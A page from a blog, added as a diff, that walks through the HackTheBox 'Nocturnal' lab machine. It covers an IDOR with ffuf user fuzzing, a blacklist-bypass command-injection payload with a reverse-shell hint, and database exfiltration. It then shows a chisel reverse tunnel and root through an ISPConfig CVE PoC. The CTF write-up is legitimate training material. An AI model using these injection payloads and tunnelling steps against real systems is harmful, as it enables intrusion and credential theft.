@@ -1,0 +1,463 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Nocturnal Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Nocturnal Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/website/profile-2.png"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Detailed notes on exploiting the Nocturnal machine in HackTheBox Pentest Labs. Difficulty: Easy OS: Linux IP: 10.10.11.64 Author: h4ck3rfirst nmap&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-nocturnal-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-nocturnal-walkthrough/"},"headline":"HackTheBox Nocturnal Walkthrough","datePublished":"2025-09-23T12:58+05:30","dateModified":"2026-09-30T20:02+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300},"description":"Detailed notes on exploiting the Nocturnal machine in HackTheBox Pentest Labs. Difficulty: Easy OS: Linux IP: 10.10.11.64 Author: h4ck3rfirst nmap&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Nocturnal Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-23T12:58" class="feed__date">September 23, 2025</time></div></div></header></div><div class="entry-wrapper content__entry"><p>Detailed notes on exploiting the Nocturnal machine in HackTheBox Pentest Labs.</p><p><strong>Difficulty</strong>: Easy<br><strong>OS</strong>: Linux<br><strong>IP</strong>: <code>10.10.11.64</code><br><strong>Author</strong>: h4ck3rfirst</p><hr><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap Scan</h3><pre><code>nmap -A -sC -sV -Pn 10.10.11.64
+</code></pre><p>Results:</p><p>22/tcp open ssh OpenSSH 8.2p1 Ubuntu 80/tcp open http nginx 1.18.0 (Ubuntu)</p><p>SSH is not immediately exploitable. Web port (80) is the main focus.</p><h3 id="web-enumeration">Web Enumeration</h3><p>Add to /etc/hosts:</p><pre><code>10.10.11.64 nocturnal.htb
+</code></pre><p><strong>Gobuster</strong></p><pre><code>gobuster dir -u http://nocturnal.htb/ -w /usr/share/wordlists/dirb/common.txt
+</code></pre><p>Found paths:</p><p>/admin.php (302 → login.php)<br>/backups (301)<br>/index.php (200)<br>/uploads (403)</p><p><strong>IDOR Vulnerability</strong></p><p>Go with basic Register/login funtions</p><p>Download endpoint observed: <code>/view.php?username=test&amp;file=sample.pdf</code></p><p>Username Enumeration (FFUF) / Burpsuite</p><pre><code>ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u &#39;http://nocturnal.htb/view.php?username=FUZZ&amp;file=sample.pdf&#39; -H &#39;Cookie: PHPSESSID=YOUR_SESSION&#39; -fs 2985
+</code></pre><p>Valid users found:</p><pre><code>admin
+
+amanda
+
+tobias
+
+test
+</code></pre><p>** Amanda’s File**</p><p>Amanda’s file privacy.odt revealed a temporary password from IT.</p><p>Attempting SSH login with Amanda’s credentials failed.</p><p>However, using them on the web login worked — Amanda has access to the /admin.php panel.</p><p>Go to admin planel</p><p>Review all that file will found sqlite3 db which saving the login credentical</p><p>Their is Backups option in which Os injection working</p><p>** Command Injection via Weak Blacklist**</p><p>admin.php source review showed: <code>$blacklist_chars = [&#39;;&#39;, &#39;&amp;&#39;, &#39;|&#39;, &#39;$&#39;, &#39; &#39;, &#39;`&#39;, &#39;{&#39;, &#39;}&#39;, &#39;&amp;&amp;&#39;];</code></p><p>Input passed directly to: <code>zip -P $password backups/...</code></p><p>** Bypass in Burpsuite**</p><p>Used:</p><p>\r\n → to inject new command</p><p>%09 \t → for space</p><p>Use encoding for reverse shell</p><p>Payload example (POST param password):</p><p><code>%0abash%09-c%09&quot;whoami&quot;</code></p><p>Whoami replace with reverse shell payload</p><h3 id="🛠️-file-exfiltration">🛠️ File Exfiltration</h3><p>Discovered the file:</p><pre><code>./nocturnal_database/nocturnal_database.db
+</code></pre><p>Used base64 encoding to exfiltrate the contents via the injection:</p><p>base64 ./nocturnal_database/nocturnal_database.db &gt; /tmp/db.txt</p><p>Then downloaded the file from web or created a downloadable backup.</p><p>** Credentials from Database**</p><p>Username	Hash (MD5)	Password</p><p>admin	d725aeba143f575736b07e045d8ceebb	N/A</p><p>amanda	df8b20aa0c935023f99ea58358fb63c4	N/A</p><p>tobias	55c82b1—————–d5061d	s-owmo———al–se</p><p>kavi	f38cde1654b39fea2bd4f72f1ae4cdda	kavi</p><p>e0Al5	101ad4543a96a7fd84908fd0d802e7db	N/A</p><p>Only tobias was allowed SSH access.</p><h2 id="shell-access-user">Shell Access (User)</h2><p><code>ssh tobias@10.10.11.64</code> Password: slo—————–e</p><p>Now we have a limited shell as tobias.</p><h2 id="privilege-escalation">Privilege Escalation</h2><h3 id="local-web-service-discovery">Local Web Service Discovery</h3><p>From the shell:</p><pre><code>netstat -tulnp | grep 8080
+</code></pre><p>Revealed a local-only service running on 127.0.0.1:8080. ** Chisel Port Forwarding** 🖥 Attacker (Your Machine):</p><pre><code>chisel server -p 9001 --reverse
+</code></pre><h3 id="🐧-victim-tobias-shell">🐧 Victim (Tobias Shell):</h3><p><code>./chisel client YOUR-IP:9001 R:8080:127.0.0.1:8080</code> OR <code>ssh -L 8081:127.0.0.1:8080 tobias@nocturnal.htb</code></p><p>Now browse <a href="http://localhost:8080">http://localhost:8080</a> on your machine to access ISPConfig.</p><p>** Exploiting ISPConfig (CVE-2023-46818)**</p><p>ISPConfig version: 3.2.2</p><p>Vulnerable to PHP code injection as root.</p><p>Reference:</p><p>GitHub PoC</p><p><a href="https://github.com/bipbopbup/CVE-2023-46818-python-exploit/blob/main/exploit.py">https://github.com/bipbopbup/CVE-2023-46818-python-exploit/blob/main/exploit.py</a></p><p>Successful Payload:</p><p>Used the exploit to inject PHP and achieve root shell.</p><h3 id="summary">Summary</h3><p>Phase	Technique / Vulnerability<br>Enumeration	Nmap + Gobuster<br>Exploitation #1	IDOR (Insecure Direct Object Reference)<br>Exploitation #2	Weak blacklist → Command injection<br>Post-Exploitation	Database exfil → Creds → SSH<br>Privilege Escalation	Local-only service → Chisel → CVE RCE</p><p>Root Access	CVE-2023-46818 via ISPConfig</p><h2 id="key-learnings">Key Learnings</h2><pre><code>Never rely solely on blacklists for input sanitization.
+
+Always secure local services or run them as unprivileged users.
+
+Exposing internal source code via web admin panels can be fatal.
+
+Chaining multiple &quot;small&quot; misconfigs = full system compromise.
+</code></pre><h3 id="flags">Flags</h3><pre><code>User: HTB{...}
+
+Root: HTB{...}
+
+Exploit responsibly. For educational purposes only.
+</code></pre></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/chisel/">chisel</a></li><li><a href="https://h4ck3rfirst.github.io/tags/code-injection/">code injection</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cracking/">cracking</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/">CTF Writeups</a></li><li><a href="https://h4ck3rfirst.github.io/tags/database/">database</a></li><li><a href="https://h4ck3rfirst.github.io/tags/easy/">Easy</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/idor/">idor</a></li><li><a href="https://h4ck3rfirst.github.io/tags/nocturnal/">nocturnal</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-nocturnal-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Nocturnal%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-nocturnal-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Nocturnal%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-nocturnal-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/hackthebox-expressway-walkthrough/" class="content__nav-link" rel="prev"><div><span>Previous</span> HackTheBox Expressway Walkthrough</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/hackthebox-planning-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> HackTheBox Planning Walkthrough</div></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-06-14T18:39" class="feed__date">June 14, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-mr-robot-walkthrough/">Tryhackme Mr robot Walkthrough</a></h3></header><p>Welcome to the walkthrough of the Robot room on TryHackMe, inspired by the Mr. Robot TV series. This lab focuses&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/">HackTheBox Soulmate Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
